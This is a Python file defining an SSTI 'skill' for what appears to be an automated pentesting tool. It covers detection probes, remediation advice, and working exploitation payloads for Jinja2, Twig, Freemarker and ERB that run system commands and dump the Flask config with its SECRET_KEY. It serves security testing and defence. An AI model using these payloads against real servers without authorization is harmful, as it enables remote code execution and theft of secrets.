"""Server-Side Template Injection (SSTI) - Detection, exploitation and remediation."""

SKILL = {
    "id": "ssti",
    "name": "Server-Side Template Injection (SSTI)",
    "category": "injection",
    "severity": "critical",

    "detection": """
- Test all input fields that are rendered in server responses
- Inject math expressions to detect template engines:
  {{7*7}} → 49 means Jinja2/Twig/Freemarker
  ${7*7} → 49 means Freemarker/Velocity/Thymeleaf
  #{7*7} → 49 means Ruby ERB/Java EL
  <%= 7*7 %> → 49 means ERB/EJS
  {{7*'7'}} → 7777777 means Jinja2 (Python)
  {{7*'7'}} → 49 means Twig (PHP)
- Look for: error pages with template names, 500 errors on special chars
- Check: search fields, name fields, email templates, PDF generators, error messages
- Test URL parameters, POST body, headers (User-Agent, Referer if logged)
""",

    "exploitation": """
- Jinja2 (Python/Flask):
  {{config}} → dump Flask config with SECRET_KEY
  {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
  {{''.__class__.__mro__[1].__subclasses__()}} → list available classes for RCE
  {{cycler.__init__.__globals__.os.popen('whoami').read()}}
- Twig (PHP):
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
- Freemarker (Java):
  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
- ERB (Ruby):
  <%= system("id") %>
  <%= `id` %>
- Document: show command output, config dump, or data extracted
- Chain: use SSTI to read source code, find more vulns, pivot to RCE
""",

    "remediation": """
- NEVER pass user input directly into template rendering
  BAD: render_template_string(user_input)
  GOOD: render_template("template.html", name=user_input)
- Use template sandboxing (Jinja2 SandboxedEnvironment)
- Whitelist allowed characters in user input for template contexts
- Disable dangerous template features (imports, function calls)
- Use logic-less templates when possible (Mustache, Handlebars)
- Set template auto-escaping ON by default
- SSH fix: Find render_template_string calls, replace with safe rendering
- SSH fix: Enable Jinja2 sandbox mode in Flask config
- Verify: Test {{7*7}} after fix, confirm it renders as literal text
""",

    "tools": ["http_request", "web_spider", "tech_fingerprint", "waf_detect"],

    "payloads": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
        "{{7*'7'}}", "{{config}}", "{{dump(app)}}", "{{self}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('whoami').read()}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
        "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}",
    ],

    "references": [
        "OWASP A03:2021 - Injection",
        "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
    ],
}
